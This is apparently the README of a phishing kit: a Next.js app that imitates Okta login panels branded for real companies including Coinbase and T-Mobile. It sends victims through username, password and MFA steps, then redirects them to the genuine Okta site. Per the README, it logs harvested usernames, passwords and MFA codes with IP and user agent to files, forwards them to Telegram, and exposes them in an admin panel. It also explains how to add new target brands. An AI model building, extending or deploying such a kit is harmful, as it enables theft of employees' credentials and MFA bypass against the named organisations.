# Okta Branded Login Panels

A Next.js application that provides dynamic, domain-based branding for Okta-style login panels with multi-step authentication flow.

## Features

- **Domain-based brand detection** - Automatically switches branding based on hostname
- **Centralized configuration** - All brand settings in a single config file
- **Multi-page login flow** - Username → Password → MFA (Push or Code)
- **Exact Okta styling** - Matches official Okta login widget design
- **TypeScript** - Full type safety throughout

## Quick Start

```bash
# Install dependencies
npm install

# Run development server
npm run dev

# Build for production
npm run build

# Start production server
npm start
```

## Project Structure

```
okta-panels/
├── src/
│   ├── app/
│   │   ├── api/auth/login/     # API route for credential handling
│   │   ├── layout.tsx          # Root layout
│   │   ├── page.tsx            # Server component for brand detection
│   │   └── LoginHandler.tsx    # Client component wrapper
│   ├── components/
│   │   └── OktaPanel.tsx       # Main login panel component
│   ├── config/
│   │   └── brands.config.ts    # ⭐ CENTRALIZED BRAND CONFIG
│   └── styles/
│       └── globals.css         # Okta-matching styles
├── public/
│   ├── favicon.ico
│   └── brands/                 # Brand-specific assets
│       ├── reyes/
│       └── tmobile/
└── logs/                       # Credential logs (auto-created)
```

## Configured Brands

| Brand | Primary Color | Domain | Features |
|-------|--------------|--------|----------|
| Reyes Holdings | #1662dd | reyesholdingsokta.okta.com | MFA |
| Coinbase | #0052ff | coinbase.okta.com | MFA, Unlock Account |
| WCG | #1662dd | wcgkey.okta.com | MFA, Unlock Account |
| Arise | #007dc1 | arise.okta.com | MFA |
| T-Mobile | #e20074 | t-mobile.okta.com | MFA, Background Image |

## Adding a New Brand

Edit `src/config/brands.config.ts` and add a new entry:

```typescript
'your-brand': {
  id: 'your-brand',
  domains: ['yourbrand.okta.com', 'yourbrand.localhost'],

  // Organization Info
  orgName: 'Your Company',
  appName: 'Okta Dashboard',

  // Logo
  logoUrl: 'https://cdn.example.com/logo.png',
  logoHeight: '40px',

  // Colors
  primaryColor: '#1662dd',
  primaryColorHover: '#1456c2',
  backgroundColor: '#f9f9f9',
  cardBackground: '#ffffff',
  titleColor: '#6e6e78',
  labelColor: '#5e5e5e',
  linkColor: '#6e6e78',
  inputBorder: '#8c8c96',

  // Optional background image
  backgroundImage: '/brands/your-brand/background.jpg',

  // Feature flags
  showPoweredByOkta: true,
  showPrivacyPolicy: true,
  showUnlockAccount: false,
  showMfa: true,

  // URLs
  helpUrl: '#',
  forgotPasswordUrl: '#',
  unlockAccountUrl: '#',
  privacyPolicyUrl: '#',
  successRedirect: 'https://yourbrand.okta.com/',
}
```

## Login Flow

The application implements a multi-page authentication flow:

1. **Sign In** - Username entry with "Keep me signed in" option
2. **Password** - Password verification with lock icon
3. **MFA Selection** - Choose between:
   - Enter a code (Okta Verify)
   - Get a push notification (Okta Verify)
4. **Code Entry** or **Push Waiting** - Complete MFA

## Local Development

Add entries to your hosts file to test different brands:

```
# Windows: C:\Windows\System32\drivers\etc\hosts
# Mac/Linux: /etc/hosts

127.0.0.1 wcg.localhost
127.0.0.1 coinbase.localhost
127.0.0.1 arise.localhost
127.0.0.1 tmobile.localhost
127.0.0.1 reyes.localhost
```

Then access:
- http://wcg.localhost:3000
- http://coinbase.localhost:3000
- http://arise.localhost:3000

## API Endpoint

### POST /api/auth/login

Handles credential submission at each step.

**Request:**
```json
{
  "brand": "wcg",
  "step": "password",
  "username": "user@example.com",
  "password": "secret"
}
```

**Response:**
```json
{
  "success": true,
  "redirect": "https://wcgkey.okta.com/"
}
```

## Logs

Credentials are logged to `logs/{brand}.log` with:
- Timestamp
- Brand ID
- Client IP
- User-Agent
- Username/Password/MFA Code

Credentials are also logged to telegram, update your telegram credentials in:
src\app\api\auth\login\route.ts

Also update your admin panel credentials in:
src\config\admin.config.ts